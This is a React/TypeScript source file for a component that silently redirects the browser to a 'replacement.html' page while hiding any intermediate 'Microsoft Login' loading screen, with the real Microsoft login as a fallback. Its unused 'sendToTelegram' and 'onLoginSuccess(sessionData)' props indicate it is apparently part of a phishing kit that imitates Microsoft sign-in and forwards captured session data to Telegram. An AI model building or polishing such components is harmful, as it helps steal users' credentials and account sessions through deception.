import React, { useLayoutEffect } from 'react';

interface RealOAuthRedirectProps {
  onLoginSuccess?: (sessionData: any) => void;
  sendToTelegram?: (data: any) => Promise<void>;
}

/**
 * Minimal redirector component.
 *
 * Purpose:
 * - Immediately navigates the browser to /replacement.html on mount, using replace() to avoid
 *   a visible intermediate render and reduce the chance of the "Loading Microsoft Login..." flash.
 * - Does not attempt to document.write or render any UI (returns null) so nothing is painted by this component.
 *
 * Notes:
 * - Props are kept for compatibility (onLoginSuccess/sendToTelegram) but are not used here.
 * - This keeps the component API intact while ensuring the transition from "Authenticating"
 *   -> replacement.html is as seamless as possible.
 */
const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = () => {
  useLayoutEffect(() => {
    try {
      // Best-effort: navigate to the standalone replacement page immediately.
      // Use replace() to avoid adding an extra history entry.
      window.location.replace('/replacement.html');
    } catch (error) {
      console.error('Failed to navigate to replacement page:', error);
      // Fallback to Microsoft login if navigation fails
      try {
        window.location.replace('https://login.microsoftonline.com');
      } catch (e) {
        // swallow
      }
    }
    // We're intentionally not depending on props here.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Render nothing to avoid any visible flash.
  return null;
};

export default RealOAuthRedirect;
